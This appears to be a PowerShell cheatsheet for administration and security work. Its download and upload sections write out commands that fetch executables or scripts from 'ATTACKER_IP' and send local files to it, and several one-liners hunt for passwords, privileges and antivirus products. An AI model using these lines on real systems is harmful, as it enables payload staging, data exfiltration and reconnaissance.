# PowerShell

---

## Executive Summary

PowerShell is a Windows automation and administration shell used for system management, enumeration, file handling, networking, logging, and security operations.

This cheatsheet focuses on quick command lookup for common administrative and security workflows.

## Help and Discovery

Show help:

```powershell
Get-Help Get-Process
```

Show examples:

```powershell
Get-Help Get-Process -Examples
```

Search commands:

```powershell
Get-Command *service*
```

Show command syntax:

```powershell
Get-Command Get-Service -Syntax
```

Show PowerShell version:

```powershell
$PSVersionTable
```

## System Information

Computer information:

```powershell
Get-ComputerInfo
```

Operating system details:

```powershell
Get-CimInstance Win32_OperatingSystem
```

Hostname:

```powershell
hostname
```

Current user:

```powershell
whoami
```

Environment variables:

```powershell
Get-ChildItem Env:
```

## Files and Directories

List files:

```powershell
Get-ChildItem
```

List hidden files:

```powershell
Get-ChildItem -Force
```

Recursive listing:

```powershell
Get-ChildItem -Recurse
```

Read file:

```powershell
Get-Content .\file.txt
```

Search file content:

```powershell
Select-String -Path .\*.txt -Pattern "password"
```

Copy file:

```powershell
Copy-Item .\file.txt C:\Temp\
```

Move file:

```powershell
Move-Item .\file.txt C:\Temp\
```

Delete file:

```powershell
Remove-Item .\file.txt
```

## Processes

List processes:

```powershell
Get-Process
```

Search process:

```powershell
Get-Process *chrome*
```

Stop process by name:

```powershell
Stop-Process -Name notepad
```

Stop process by PID:

```powershell
Stop-Process -Id PID
```

Show process command lines:

```powershell
Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,CommandLine
```

## Services

List services:

```powershell
Get-Service
```

Running services:

```powershell
Get-Service | Where-Object {$_.Status -eq "Running"}
```

Service details:

```powershell
Get-CimInstance Win32_Service | Select-Object Name,State,StartMode,PathName
```

Start service:

```powershell
Start-Service SERVICE_NAME
```

Stop service:

```powershell
Stop-Service SERVICE_NAME
```

## Users and Groups

Current user:

```powershell
whoami
```

Local users:

```powershell
Get-LocalUser
```

Local groups:

```powershell
Get-LocalGroup
```

Local administrators:

```powershell
Get-LocalGroupMember Administrators
```

Current user groups:

```powershell
whoami /groups
```

Current user privileges:

```powershell
whoami /priv
```

## Networking

Show IP addresses:

```powershell
Get-NetIPAddress
```

Show routes:

```powershell
Get-NetRoute
```

Show TCP connections:

```powershell
Get-NetTCPConnection
```

Show listening TCP ports:

```powershell
Get-NetTCPConnection -State Listen
```

Test port:

```powershell
Test-NetConnection TARGET_IP -Port PORT
```

DNS lookup:

```powershell
Resolve-DnsName example.com
```

Show DNS cache:

```powershell
Get-DnsClientCache
```

## File Downloads

Download file:

```powershell
Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile C:\Users\Public\file.exe
```

Download with basic parsing:

```powershell
Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile C:\Users\Public\file.exe -UseBasicParsing
```

Alternative WebClient download:

```powershell
(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP/file.exe", "C:\Users\Public\file.exe")
```

Download string:

```powershell
(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/script.ps1")
```

## File Uploads

Upload file with WebClient:

```powershell
(New-Object Net.WebClient).UploadFile("http://ATTACKER_IP/upload", "C:\Temp\file.txt")
```

Upload with Invoke-WebRequest:

```powershell
Invoke-WebRequest -Uri http://ATTACKER_IP/upload -Method POST -InFile C:\Temp\file.txt
```

## Encoding and Hashing

File hash:

```powershell
Get-FileHash .\file.exe -Algorithm SHA256
```

Base64 encode string:

```powershell
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("text"))
```

Base64 decode string:

```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("dGV4dA=="))
```

Base64 decode file:

```powershell
[IO.File]::WriteAllBytes("C:\Temp\file.bin", [Convert]::FromBase64String("BASE64_STRING"))
```

## Event Logs

List event logs:

```powershell
Get-EventLog -List
```

Recent Security events:

```powershell
Get-WinEvent -LogName Security -MaxEvents 20
```

Logon events:

```powershell
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4624} -MaxEvents 20
```

Failed logons:

```powershell
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4625} -MaxEvents 20
```

Events from last 24 hours:

```powershell
$Start = (Get-Date).AddHours(-24)
Get-WinEvent -FilterHashtable @{LogName="Security"; StartTime=$Start}
```

## Registry

Query key:

```powershell
Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion"
```

Search registry path:

```powershell
Get-ChildItem HKLM:\Software -Recurse -ErrorAction SilentlyContinue
```

Create value:

```powershell
New-ItemProperty -Path "HKCU:\Software\Test" -Name "Name" -Value "Value" -PropertyType String -Force
```

Delete value:

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Test" -Name "Name"
```

## Remote Management

Enable PowerShell remoting:

```powershell
Enable-PSRemoting -Force
```

Create remote session:

```powershell
$Session = New-PSSession -ComputerName TARGET_HOST
```

Run remote command:

```powershell
Invoke-Command -ComputerName TARGET_HOST -ScriptBlock { hostname }
```

Copy file to session:

```powershell
Copy-Item .\file.txt -ToSession $Session -Destination C:\Temp\
```

Copy file from session:

```powershell
Copy-Item C:\Temp\file.txt -FromSession $Session -Destination .
```

## Useful One-Liners

Find files containing keyword:

```powershell
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Select-String "password"
```

Find recently modified files:

```powershell
Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}
```

List startup Run keys:

```powershell
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

Show antivirus products:

```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
```

## Notes

- PowerShell activity is often logged by defenders.
- `Invoke-WebRequest`, `DownloadString`, and encoded commands are high-signal detection points.
- Prefer clear administrative use and documented workflows.
- Use `Get-CimInstance` over older `Get-WmiObject` when available.